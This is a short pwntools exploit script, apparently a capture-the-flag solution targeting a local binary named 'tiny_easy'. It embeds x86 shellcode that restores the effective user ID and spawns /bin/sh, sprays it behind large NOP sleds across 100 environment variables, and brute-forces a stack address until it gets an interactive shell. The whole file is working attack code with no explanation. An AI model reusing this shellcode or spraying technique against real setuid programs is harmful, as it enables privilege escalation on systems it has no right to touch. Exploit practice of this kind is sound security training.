from pwn import *

# context.log_level = 'debug'
shellcode = b"\x6a\x31\x58\xcd\x80\x89\xc3\x89\xd9\x6a\x46\x58\xcd\x80\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80\x6a\x01\x58\xcd\x80"

shellcode_addr = 0xffddbbcc

while True:

    args = [p32(shellcode_addr)]

    envp = {}
    for i in range(100):
        envp["env-" + str(i)] = b'\x90' * 5000 + shellcode

    p = process(argv=args,
                executable='./tiny_easy',
                env=envp)
    try:
        a = p.recv(timeout=1)
        p.interactive()
    except:
        pass
    p.close()
    
    shellcode_addr += 1
